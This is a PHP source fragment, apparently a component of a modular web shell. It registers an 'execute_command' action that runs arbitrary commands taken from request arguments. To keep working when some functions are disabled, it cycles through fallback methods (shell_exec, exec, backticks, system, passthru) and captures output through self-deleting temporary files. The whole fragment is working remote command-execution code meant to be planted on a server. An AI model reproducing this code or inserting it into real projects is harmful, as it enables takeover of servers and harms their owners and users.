
////////////////////////////////////////////////////////////////////////
// Required classes for Command-Execution with Execution Alternatives //
////////////////////////////////////////////////////////////////////////

class ExecuteCommandAction implements Action
{
    public function run($args)
    {
        // Extract the command from the arguments
        $cmd = $args->cmd;

        // Run the command and add it to the command history
        $output = SystemService::getInstance()->execute($cmd);

        // Return the command output
        return $output;
    }
}

interface ExecutionMethod
{
    public function execute($cmd);
    public function isAvailable();
}

class ShellExecExecutionMethod implements ExecutionMethod
{
    public function execute($cmd)
    {
        return shell_exec($cmd);
    }

    public function isAvailable()
    {
        return function_exists('shell_exec');
    }
}

class BackticksExecutionMethod implements ExecutionMethod
{
    public function execute($cmd)
    {
        return `$cmd`;
    }

    public function isAvailable()
    {
        return function_exists('shell_exec') && !ini_get('safe_mode');
    }
}

abstract class BlindExecutionMethod implements ExecutionMethod
{
    public function execute($cmd)
    {
        // Create a temporary random file and redirect the command output to it
        $fileName = bin2hex(random_bytes(32)) . '.txt';
        $this->run_command($cmd . " > {$fileName} 2>&1");

        // Read the contents of the file
        $fd = fopen($fileName, 'r');
        $output = fread($fd, filesize($fileName));

        // Delete the temporary file
        unlink($fileName);
        
        // Return the command output
        return $output;
    }

    abstract protected function run_command($cmd);
}

class ExecExecutionMethod implements ExecutionMethod
{
    public function execute($cmd)
    {
        $output = [];
        exec($cmd, $output);
        return implode("\n", $output);
    }

    public function isAvailable()
    {
        return function_exists('exec');
    }
}

class IdentifyExecutionAlternativesStep implements Step
{
    private $executionMethods;

    public function __construct($executionMethods)
    {
        $this->executionMethods = $executionMethods;
    }

    public function run()
    {
        // Attempt to identify a valid execution method
        $found = false;

        // Loop until a valid execution method is found
        for ($i = 0; $i < sizeof($this->executionMethods) && !$found; $i++) {
            if ($this->executionMethods[$i]->isAvailable()) {
                SystemService::getInstance()->setExecutionMethod($this->executionMethods[$i]);
                $found = true;
            }
        }
    }
}

final class PassthruExecutionMethod extends BlindExecutionMethod
{
    protected function run_command($cmd)
    {
        passthru($cmd);
    }

    public function isAvailable()
    {
        return function_exists('passthru');
    }
}

final class SystemExecutionMethod extends BlindExecutionMethod
{
    protected function run_command($cmd)
    {
        system($cmd);
    }

    public function isAvailable()
    {
        return function_exists('system');
    }
}

//////////////////////////////////////////////////////////////////////////////
// Required configuration for Command-Execution with Execution Alternatives //
//////////////////////////////////////////////////////////////////////////////

$executionMethods = [
    new ShellExecExecutionMethod(),
    new ExecExecutionMethod(),
    new BackticksExecutionMethod(),
    new SystemExecutionMethod(),
    new PassthruExecutionMethod()
];
array_push($steps, new IdentifyExecutionAlternativesStep($executionMethods));
$actions['execute_command'] = new ExecuteCommandAction();

